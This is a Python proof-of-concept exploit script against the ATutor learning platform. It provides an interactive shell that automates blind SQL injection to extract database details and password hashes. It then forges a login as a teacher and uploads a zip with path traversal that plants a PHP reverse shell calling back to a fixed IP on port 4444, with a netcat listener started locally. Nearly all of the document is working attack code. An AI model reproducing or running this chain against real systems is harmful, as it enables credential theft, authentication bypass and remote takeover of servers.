# Exploit Title: Blind SQLi Extractor - POC
# Date: 2021-04-05
# Exploit Author: Youssef B
# Tested against: ATutor until 2017

import os, sys, re, requests, cmd, hashlib, zipfile
from subprocess import call
from io import BytesIO
from pathlib import Path
from colorama import Fore, Style, init
init()

if len(sys.argv) != 3:
        print(f"(+) usage: {sys.argv[0]} <target> <uri>")
        print(f"(+) eg: {sys.argv[0]} 192.168.150.103 \"http://%s/ATutor/mods/_standard/social/index_public.php?q=%s\"")
        sys.exit(-1)

ip, uri = sys.argv[1], sys.argv[2]

class colorterm:
    ENDC = '\033[0m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'

class sqli_prompt(cmd.Cmd):
    intro = '\nWelcome to the sqlifinder shell. Type help or ? to list commands.\n'
    prompt = '(sqlifinder) '

    def do_get_db_version(self, arg):
        print("(+) Retrieving database version...")
        db_get_info()
    
    def do_get_db_creds(self, arg):
        db_creds()
    
    def do_get_db_current_user(sefl, arg):
        print("(+) Retrieving current user....")
        db_get_info()

    def do_get_db_users(self, arg):
        print("(+) Retrieving username....")
        db_get_info()
    
    def do_show_db_grants(self, arg):
        print("(+) Retrieving privileges for current user....")
        db_get_info()
    
    def do_get_hash(self, arg):
        db_hash()

    def do_get_reverse_shell(self, arg):
        _, s = login_bypass(ip)
        if s:
            print(f"{Fore.YELLOW}\n(+) Login successful!\n{Style.RESET_ALL}")
            build_zip()
            print("(+) Uploading shell...\n")
            if upload_shell(ip, s):
                target  = "http://%s/ATutor/mods/poc.php4" % ip
                r       = s.get(target)
                print(f"{Fore.GREEN}(*) Status code:{Style.RESET_ALL} {r.status_code}\n")
            else:
                print("Unable to connect...")
        else:
            print(f"{Fore.RED}(-) Failed!\n{Style.RESET_ALL}")

    def do_quit(self, arg):
        exit(0)


def search_blind_sqli(ip, uri, inj_str):
    for i in range(32, 126):
        repl    = inj_str.replace("[CHAR]", str(i))
        target  = uri %(ip, repl)
        r       = requests.get(target)
        
        content_length = int(r.headers['Content-Length'])

        if (content_length > 20):
            return i

    return None

def db_extractor(r, ip, uri, qr_inj):
    extracted = ""

    for i in range(1, r):
        injection_string = "test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" %(qr_inj,i)
        search_blind = search_blind_sqli(ip, uri, injection_string)

        try:
            extracted += chr(search_blind)
            extracted_char = chr(search_blind)
            sys.stdout.write(colorterm.GREEN + extracted_char)
            sys.stdout.flush()
        except:
            break

    if extracted_char is not None:
        print(colorterm.ENDC + "\n(+) done!")
        print(colorterm.WARNING + "(+) You've found something interesting!\n" + colorterm.ENDC)
    else:
        print(colorterm.ENDC + "\n(+) Unfortunately, nothing found...")
    
    return extracted

def db_creds():
    print("(+) Retrieving username....")
    username = db_get_info()
    
    print("(+) Retrieving password hash....")
    injection_pass = input("Enter your password query payload: ")
    password = db_extractor(50, ip, uri, injection_pass)

    print("(+) Credentials: " + colorterm.GREEN + username + colorterm.ENDC + " / " + colorterm.GREEN + password + colorterm.ENDC)

def db_hash():
    print("(+) Retrieving password hash....")
    injection_pass = input("Enter your password query payload: ")
    password = db_extractor(50, ip, uri, injection_pass)

    return password

def db_get_info():    
    injection_string = input("Enter your query payload: ")
    return db_extractor(255, ip, uri, injection_string)

def gen_hash(passwd, token):
    h       = hashlib.sha1()
    p, t    = passwd.encode(), token.encode()

    h.update(p + t)
    print(f"\n{Fore.MAGENTA}Hashing result:{Style.RESET_ALL} {h.hexdigest()}\n")

    return h.hexdigest()

def login_bypass(ip):
    target  = "http://%s/ATutor/login.php" % ip
    token   = "hax"
    hashp   = db_hash()
    hashed = gen_hash(hashp, token)
    d = {
        "form_password_hidden" : hashed,
        "form_login": "teacher",
        "submit": "Login",
        "token" : token
        }

    s = requests.Session()
    r = s.post(target, data=d)
    res = r.text

    if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
        print(f"{Fore.GREEN}(*) Status code:{Style.RESET_ALL} {r.status_code}")
        print(f"{Fore.GREEN}(*) Headers:{Style.RESET_ALL} {r.headers}")
        print(f"{Fore.GREEN}(*) Cookies:{Style.RESET_ALL} {cooking.get_dict()}")
        return True, s
    else:
        print(f"{Fore.RED}(-) Oo ... Nothing here...\n{Style.RESET_ALL}")

def build_zip():
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../../../../../../../var/www/html/ATutor/mods/poc.php4', '<?php exec(\"/bin/bash -c \'bash -i >& /dev/tcp/192.168.119.150/4444 0>&1\'\");?>')
    z.writestr('imsmanifest.xml', 'invalid xml!')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close()

    if Path('poc.zip').is_file():
        print (f"{Fore.GREEN}(*)File successfully created.\n{Style.RESET_ALL}")
    else:
        print (f"{Fore.RED}Error during zip file creation.\n{Style.RESET_ALL}")

def upload_shell(ip, s):
    target  = "http://%s/ATutor/mods/_standard/tests/import_test.php" % ip
    burp0_headers = {"Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://atutor",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryrlHBTzQcq4N71JxB",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Referer": "http://atutor/ATutor/mods/_standard/tests/index.php",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close"}
    burp0_data = "------WebKitFormBoundaryrlHBTzQcq4N71JxB\r\nContent-Disposition: form-data; name=\"file\"; filename=\"poc.zip\"\r\nContent-Type: application/zip\r\n\r\nPK\x03\x04\x14\x00\x00\x00\x08\x00tq\x8cR\xb8\xadB\xcbI\x00\x00\x00M\x00\x00\x006\x00\x00\x00../../../../../../../var/www/html/ATutor/mods/poc.php4\xb3\xb1/\xc8(PH\xadHM\xd6P\xd2O\xca\xcc\xd3OJ,\xceP\xd0MVP\x8702\x15\xec\xd4\x14\xf4SR\xcb\xf4K\x92\x0b\xf4\r-\x8d\xf4\x0c\xcd,\xf4\x0c\r-\xf5\x0cM\r\xf4M\x80@\xc1\xc0N\xcdP]I\xd3\xda\xde\x0e\x00PK\x03\x04\x14\x00\x00\x00\x08\x00tq\x8cR\x8fw\xa8\xdc\x0e\x00\x00\x00\x0c\x00\x00\x00\x0f\x00\x00\x00imsmanifest.xml\xcb\xcc+K\xcc\xc9LQ\xa8\xc8\xcdQ\x04\x00PK\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00tq\x8cR\xb8\xadB\xcbI\x00\x00\x00M\x00\x00\x006\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x01\x00\x00\x00\x00../../../../../../../var/www/html/ATutor/mods/poc.php4PK\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00tq\x8cR\x8fw\xa8\xdc\x0e\x00\x00\x00\x0c\x00\x00\x00\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x01\x9d\x00\x00\x00imsmanifest.xmlPK\x05\x06\x00\x00\x00\x00\x02\x00\x02\x00\xa1\x00\x00\x00\xd8\x00\x00\x00\x00\x00\r\n------WebKitFormBoundaryrlHBTzQcq4N71JxB\r\nContent-Disposition: form-data; name=\"submit_import\"\r\n\r\nImport\r\n------WebKitFormBoundaryrlHBTzQcq4N71JxB--\r\n"

    # s = login_bypass(ip)
    r = s.post(target, headers=burp0_headers, data=burp0_data)
    res = r.text

    if "XML error: Not well-formed (invalid token) at line 1" in res:
        print(f"{Fore.GREEN}(*) Successfully uploaded reverse shell php file.{Style.RESET_ALL}")
        print(f"{Fore.GREEN}(*) Reverse connecting to local ip on port 4444...\n{Style.RESET_ALL}")
        netcat = 'nc -nvlp 4444'
        call(netcat,shell=True)
        return True
    return False

def main():
    sqli_prompt().cmdloop()


if __name__ == "__main__":
    main()
